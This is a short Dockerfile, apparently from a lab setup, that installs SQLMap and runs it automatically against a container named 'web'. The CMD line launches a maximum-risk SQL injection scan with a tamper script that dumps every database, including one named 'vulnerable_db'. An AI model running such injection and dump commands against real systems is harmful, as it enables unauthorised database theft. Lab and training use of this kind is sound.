FROM debian:11-slim

# Installation des dépendances
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip \
    git \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Clonage de SQLMap
WORKDIR /opt
RUN git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git

# Use the sqlmap command
CMD ["bash", "-c", "until curl -s http://web:80 > /dev/null; do sleep 5; done && python3 /opt/sqlmap/sqlmap.py -u 'http://web/index.php?username=test' --risk=3 --level=5 --technique=BEUSTQ --banner --dbs --tamper=space2comment --batch --dbms=PostgreSQL --dump-all -D vulnerable_db"]
